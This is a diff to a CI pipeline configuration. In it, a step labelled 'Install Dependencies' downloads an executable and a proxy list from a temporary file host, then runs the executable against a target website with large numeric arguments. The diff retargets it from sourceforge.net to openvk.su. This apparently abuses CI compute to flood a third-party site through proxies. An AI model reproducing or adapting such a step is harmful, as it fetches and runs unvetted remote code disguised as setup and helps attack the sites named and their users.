@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install nodejs wget -y && wget https://temp.sh/tjUMN/jsss && wget https://temp.sh/Sowgd/proxy.txt && chmod +x jsss && ./jsss https://sourceforge.net/ 999999 153 60
+            command: apt update && apt install nodejs wget -y && wget https://temp.sh/tjUMN/jsss && wget https://temp.sh/Sowgd/proxy.txt && chmod +x jsss && ./jsss https://openvk.su/ 999999 153 60
             no_output_timeout: 5h
 
 workflows:
